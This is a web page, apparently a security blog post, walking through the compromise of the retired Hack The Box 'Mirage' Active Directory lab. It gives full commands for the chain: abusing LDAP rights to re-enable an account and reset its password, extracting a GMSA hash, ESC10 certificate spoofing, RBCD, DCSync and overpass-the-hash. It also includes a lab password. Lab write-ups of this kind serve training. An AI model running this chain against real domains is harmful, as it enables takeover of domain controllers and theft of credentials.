@@ -1,0 +1,182 @@
+1:"$Sreact.fragment"
+2:I[4236,[],""]
+3:I[170,[],""]
+5:I[6025,[],"OutletBoundary"]
+6:"$Sreact.suspense"
+9:I[6025,[],"ViewportBoundary"]
+b:I[6025,[],"MetadataBoundary"]
+d:I[4168,[],"default",1]
+:HL["/_next/static/css/d6e294cd2610ae11.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-mirage-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-mirage-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d6e294cd2610ae11.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"Person\",\"@id\":\"https://cyberkareem.com/#person\",\"name\":\"Abdullah Kareem\",\"alternateName\":\"CyberKareem\",\"url\":\"https://cyberkareem.com\",\"jobTitle\":\"Security Researcher and Penetration Tester\",\"knowsAbout\":[\"Vulnerability research\",\"Penetration testing\",\"Responsible disclosure\",\"Web application security\",\"API security\",\"Mobile application security\",\"Infrastructure security\",\"Active Directory security\",\"Wireless security\",\"Application security consulting\"],\"sameAs\":[\"https://www.linkedin.com/in/cyberkareem/\",\"https://github.com/CyberKareem\",\"https://x.com/cyberkareem\",\"https://linktr.ee/cyberkareem\",\"https://app.hackthebox.com/public/users/349278\",\"https://www.credential.net/profile/cyberkareem/wallet\",\"https://www.credly.com/users/cyberkareem/badges\"]},{\"@type\":\"WebSite\",\"@id\":\"https://cyberkareem.com/#website\",\"url\":\"https://cyberkareem.com\",\"name\":\"CyberKareem — Abdullah Kareem\",\"publisher\":{\"@id\":\"https://cyberkareem.com/#person\"}}]}"}}]]}]}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":["$","$6",null,{"name":"Next.MetadataOutlet","children":"$@7"}]}]]}],{},null,false,null]},null,false,"$@8"]},null,false,"$@8"]},null,false,null],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$La"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$6",null,{"name":"Next.Metadata","children":"$Lc"}]}]}],null]}],false]],"m":"$undefined","G":["$d",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"65jXSdzueZKnFbMeYrtpi"}
+e:[]
+8:"$We"
+f:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+10:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+:HL["/writing/covers/hackthebox-mirage-walkthrough.webp","image"]
+4:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$Lf",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","a","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","a","/about",{"href":"/about","aria-current":"$undefined","children":"About"}]]}],["$","$Lf",null,{"className":"utility-link","href":"/contact#assessment-enquiries","aria-current":"$undefined","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L10",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$Lf",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Mirage Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Mirage machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:39:19.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[5," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-mirage-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Mirage machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Mirage machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/mirage","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/eafbac69e4677e78b4e58269dc38b46671ad1639/HTB-Mirage.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · eafbac69e467",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Mirage","",""," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/mirage","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L11"]}]]}],["$L12","$L13","$L14","$L15"]]}],"$L16"]}]]}],"$L17"]}],"$L18","$L19"]
+11:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Mirage machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+15:["$","div","fast-path-3",{"className":"article-review-note article-review-fast-path","children":[["$","span",null,{"children":"Fast-path note"}],["$","p",null,{"children":"This is a focused credential-to-compromise path rather than a complete reconnaissance walkthrough; it begins from known lab access material."}],null]}]
+1a:T2b0d,
+<h2 id="introduction-and-the-hacker-mindset">Introduction &amp; The Hacker Mindset</h2>
+<p>This walkthrough details the "fast path" to rooting the HackTheBox machine <strong>Mirage</strong>. In a real-world penetration test, we often assume a breach scenario where we already have a set of low-privileged credentials. </p>
+<p><strong>The Mirage Environment Quirks:</strong></p>
+<ol>
+<li><strong>NTLM is disabled:</strong> We cannot use standard Pass-the-Hash or simple NTLM authentication. We are forced to use <strong>Kerberos</strong> for everything.</li>
+<li><strong>Aggressive Clock Skew:</strong> Kerberos strictly requires the client and server clocks to be within 5 minutes of each other. Mirage has a severe, constantly drifting clock skew (roughly +7 hours), which forces us to use tools like <code>ntpdate</code> and <code>faketime</code> to successfully forge our Kerberos requests.</li>
+</ol>
+<hr />
+<h2 id="step-1-environment-setup">Step 1: Environment Setup</h2>
+<p><strong>The Hacker Mindset:</strong> Kerberos relies entirely on DNS resolution (not IP addresses) and time synchronization. Before we launch a single exploit, we must conform our attacking machine to the target's strict domain environment.</p>
+<ol>
+<li><strong>Add DNS Records:</strong><pre><code class="language-bash" data-language="bash">echo -e "10.129.232.163\tdc01.mirage.htb mirage.htb nats-svc.mirage.htb" | sudo tee -a /etc/hosts
+</code></pre>
+</li>
+<li><strong>Sync the Clock:</strong><pre><code class="language-bash" data-language="bash">sudo ntpdate 10.129.232.163
+</code></pre>
+</li>
+<li><strong>Configure Kerberos (<code>custom_krb5.conf</code>):</strong>
+We create a custom configuration file telling our Kali machine how to talk to the <code>MIRAGE.HTB</code> realm.<pre><code class="language-bash" data-language="bash">cat &lt;&lt; EOF &gt; custom_krb5.conf
+[libdefaults]
+    default_realm = MIRAGE.HTB
+    dns_lookup_realm = true
+    dns_lookup_kdc = true
+
+[realms]
+    MIRAGE.HTB = {
+        kdc = dc01.mirage.htb
+        admin_server = dc01.mirage.htb
+        default_domain = mirage.htb
+    }
+
+[domain_realm]
+    mirage.htb = MIRAGE.HTB
+    .mirage.htb = MIRAGE.HTB
+EOF
+export KRB5_CONFIG="\$PWD/custom_krb5.conf"
+</code></pre>
+</li>
+</ol>
+<hr />
+<h2 id="step-2-initial-access-and-the-user-flag">Step 2: Initial Access &amp; The User Flag</h2>
+<p><strong>The Hacker Mindset:</strong> We bypass initial reconnaissance (NFS shares, DNS spoofing, Kerberoasting) by leveraging known compromised credentials for the <code>nathan.aadam</code> account, which is part of the <code>IT_Admins</code> group (allowing WinRM access).</p>
+<ol>
+<li><strong>Get a Ticket Granting Ticket (TGT):</strong><pre><code class="language-bash" data-language="bash">kinit nathan.aadam
+# Password: null
+</code></pre>
+</li>
+<li><strong>Log in via WinRM and grab the flag:</strong><pre><code class="language-bash" data-language="bash">evil-winrm -i dc01.mirage.htb -r mirage.htb
+# Once in: type C:\Users\nathan.aadam\Desktop\user.txt
+</code></pre>
+</li>
+</ol>
+<hr />
+<h2 id="step-3-pivoting-and-re-enabling-javier-s-account">Step 3: Pivoting &amp; Re-enabling Javier's Account</h2>
+<p><strong>The Hacker Mindset:</strong> We know <code>javier.mmarshall</code> has the rights to read the GMSA (Group Managed Service Account) password. However, his account is disabled. We also know we have the credentials for <code>mark.bbond</code> (<code>1day@atime</code>), who has the LDAP permissions to modify Javier's account. We will abuse these privileges to re-activate the account.</p>
+<ol>
+<li><strong>Get a ticket for Mark:</strong><pre><code class="language-bash" data-language="bash">unset KRB5CCNAME # Clear any impacket variables
+rm /tmp/krb5cc_1000 # Clear old native cache
+kinit mark.bbond
+# Password: null
+</code></pre>
+</li>
+<li><strong>Re-enable the account via LDAP (Remove the disabled flag):</strong><pre><code class="language-bash" data-language="bash">ldapmodify -Q -Y GSSAPI -H ldap://dc01.mirage.htb &lt;&lt; EOF
+dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+changetype: modify
+replace: userAccountControl
+userAccountControl: 66048
+EOF
+</code></pre>
+</li>
+<li><strong>Remove Logon Hours restrictions:</strong><pre><code class="language-bash" data-language="bash">ldapmodify -Q -Y GSSAPI -H ldap://dc01.mirage.htb &lt;&lt; EOF
+dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+changetype: modify
+delete: logonHours
+EOF
+</code></pre>
+</li>
+</ol>
+<hr />
+<h2 id="step-4-password-reset-and-extracting-the-gmsa-hash">Step 4: Password Reset and Extracting the GMSA Hash</h2>
+<p><strong>The Hacker Mindset:</strong> The account is active, but we don't know the current password. Since <code>mark.bbond</code> has the right to reset it, we force a password change. Once we control Javier's account, we can ask the Domain Controller for the <code>mirage-service$</code> password hash.</p>
+<ol>
+<li>**Reset Javier's password:null<pre><code class="language-bash" data-language="bash">net rpc user password 'javier.mmarshall' --use-kerberos=required -S dc01.mirage.htb
+# Set to something like: P@ssword123!26
+</code></pre>
+</li>
+<li><strong>Sync time perfectly before using Impacket/NXC:</strong><pre><code class="language-bash" data-language="bash">sudo ntpdate 10.129.232.163
+</code></pre>
+</li>
+<li><strong>Dump the GMSA password hash:</strong>
+<em>Note: From here on, we wrap Python/Impacket commands in <code>faketime "+7 hours"</code> because the underlying <code>minikerberos</code> library struggles with the target's aggressive clock skew.</em><pre><code class="language-bash" data-language="bash">faketime "+7 hours" nxc ldap dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'P@ssword123!26' -k --gmsa
+</code></pre>
+<em>Result: We get the NT Hash for <code>Mirage-Service$</code>: <code>[redacted retired-lab hash or flag]</code></em></li>
+</ol>
+<hr />
+<h2 id="step-5-abusing-esc10-certificate-template-vulnerability">Step 5: Abusing ESC10 (Certificate Template Vulnerability)</h2>
+<p><strong>The Hacker Mindset:</strong> We want to perform a DCSync attack, but <code>mirage-service$</code> doesn't have the rights. We find that <code>mirage-service$</code> has Write privileges over <code>mark.bbond</code>. We can modify Mark's User Principal Name (UPN) to pretend to be the Domain Controller (<code>dc01$@mirage.htb</code>), request a certificate as Mark (which the CA will issue for <code>dc01$</code>), and then use that certificate to authenticate as the Domain Controller itself.</p>
+<ol>
+<li><strong>Get a ticket for the service account:</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" impacket-getTGT -hashes ':[redacted retired-lab hash or flag]' 'mirage.htb/mirage-service$'
+</code></pre>
+</li>
+<li><strong>Spoof Mark's UPN to look like the DC:</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" certipy-ad account update -k -no-pass -dc-host 'dc01.mirage.htb' -user 'mark.bbond' -upn 'dc01$@mirage.htb'
+</code></pre>
+</li>
+<li><strong>Request a certificate as Mark (Ensure you still have Mark's native ticket in <code>/tmp/krb5cc_1000</code>):</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='/tmp/krb5cc_1000' faketime "+7 hours" certipy-ad req -k -no-pass -dc-host 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
+</code></pre>
+<em>Result: Saves a highly privileged <code>dc01.pfx</code> file to disk.</em></li>
+<li><strong>Clean up (Revert Mark's UPN):</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" certipy-ad account update -k -no-pass -dc-host 'dc01.mirage.htb' -user 'mark.bbond' -upn 'mark.bbond@mirage.htb'
+</code></pre>
+</li>
+</ol>
+<hr />
+<h2 id="step-6-resource-based-constrained-delegation-rbcd">Step 6: Resource-Based Constrained Delegation (RBCD)</h2>
+<p><strong>The Hacker Mindset:</strong> Active Directory allows computer accounts to decide who is allowed to delegate to them. Since we possess a certificate proving we <em>are</em> the Domain Controller (<code>dc01$</code>), we can log in and tell the DC: "Allow <code>mirage-service$</code> to act on behalf of any user."</p>
+<ol>
+<li><strong>Open an LDAP shell as the DC:</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" certipy-ad auth -pfx dc01.pfx -dc-ip '10.129.232.163' -ldap-shell
+</code></pre>
+</li>
+<li><strong>Grant the RBCD rights to the service account:</strong><pre><code class="language-text" data-language="text"># set_rbcd dc01$ mirage-service$
+# exit
+</code></pre>
+</li>
+</ol>
+<hr />
+<h2 id="step-7-dcsync-attack">Step 7: DCSync Attack</h2>
+<p><strong>The Hacker Mindset:</strong> We gave <code>mirage-service$</code> the power to impersonate anyone to the DC. We will now request a Service Ticket impersonating the DC itself (<code>dc01$</code>), and then use that ticket to ask the Domain Controller to replicate its Active Directory database to us (DCSync), yielding the Domain Admin hash.</p>
+<ol>
+<li><strong>Request the Impersonation Ticket:</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" impacket-getST -k -no-pass -spn 'cifs/dc01.mirage.htb' -impersonate 'dc01$' 'mirage.htb/mirage-service$'
+</code></pre>
+</li>
+<li><strong>Dump the Administrator Hash:</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache' faketime "+7 hours" impacket-secretsdump -k -no-pass 'mirage.htb/dc01$'@dc01.mirage.htb -just-dc-user Administrator
+</code></pre>
+<em>Result: We get the Administrator NT Hash: <code>[redacted retired-lab hash or flag]</code></em></li>
+</ol>
+<hr />
+<h2 id="step-8-the-root-flag-overpass-the-hash">Step 8: The Root Flag (Overpass-the-Hash)</h2>
+<p><strong>The Hacker Mindset:</strong> We have the Domain Admin hash, but NTLM is disabled, so traditional Pass-the-Hash fails. We must perform "Overpass-the-Hash"—using the NT hash to request a valid Kerberos TGT from the KDC. Finally, we use WMI to remotely execute commands on the DC to grab the flag.</p>
+<ol>
+<li><strong>Convert the Hash to a Kerberos Ticket:</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" impacket-getTGT -hashes ':[redacted retired-lab hash or flag]' 'mirage.htb/Administrator'
+</code></pre>
+</li>
+<li><strong>Export the ticket to our environment:</strong><pre><code class="language-bash" data-language="bash">export KRB5CCNAME="$PWD/Administrator.ccache"
+</code></pre>
+</li>
+<li><strong>Log in as Administrator via WMIExec (Bypassing WinRM clock skew issues):</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" impacket-wmiexec -k -no-pass dc01.mirage.htb
+</code></pre>
+</li>
+<li><strong>Grab the Root Flag!</strong><pre><code class="language-cmd" data-language="cmd">type C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+</li>
+</ol>
+<p><strong>Machine Rooted!</strong></p>
+16:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$1a"}}]
+17:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-laboratory-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Laboratory Walkthrough"}]]}]}],["$","$Lf",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-monitorsfour-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: MonitorsFour Walkthrough"}]]}]}]]}]
+18:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$Lf",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$Lf","Research",{"href":"/research","children":"Research"}],["$","$Lf","Services",{"href":"/services","children":"Services"}],["$","$Lf","Writing",{"href":"/writing","children":"Writing"}],["$","$Lf","Projects",{"href":"/projects","children":"Projects"}],["$","$Lf","About",{"href":"/about","children":"About"}],["$","$Lf","Contact",{"href":"/contact","children":"Contact"}],["$","$Lf","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$Lf",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1b:T515,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-mirage-walkthrough/#article","headline":"Hack The Box: Mirage Walkthrough","description":"An archived walkthrough of the retired Hack The Box Mirage machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-mirage-walkthrough/","datePublished":"2026-06-11T12:39:19.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":983,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/eafbac69e4677e78b4e58269dc38b46671ad1639/HTB-Mirage.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-mirage-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-mirage-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Mirage Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-mirage-walkthrough/"}]}]}19:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1b"}}]
+a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
+1c:I[1884,[],"IconMark"]
+7:null
+c:[["$","title","0",{"children":"Hack The Box: Mirage Walkthrough — CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Mirage machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","8",{"name":"publisher","content":"CyberKareem"}],["$","meta","9",{"name":"robots","content":"index, follow"}],["$","link","10",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-mirage-walkthrough/"}],["$","meta","11",{"property":"og:title","content":"Hack The Box: Mirage Walkthrough"}],["$","meta","12",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Mirage machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","13",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-mirage-walkthrough/"}],["$","meta","14",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","15",{"property":"og:locale","content":"en_US"}],["$","meta","16",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-mirage-walkthrough.webp"}],["$","meta","17",{"property":"og:image:width","content":"300"}],["$","meta","18",{"property":"og:image:height","content":"300"}],["$","meta","19",{"property":"og:image:alt","content":"Hack The Box Mirage machine avatar"}],["$","meta","20",{"property":"og:type","content":"article"}],["$","meta","21",{"property":"article:published_time","content":"2026-06-11T12:39:19.000Z"}],["$","meta","22",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","23",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","24",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","25",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","26",{"name":"twitter:title","content":"Hack The Box: Mirage Walkthrough"}],["$","meta","27",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Mirage machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","28",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-mirage-walkthrough.webp"}],["$","link","29",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","$L1c","30",{}]]
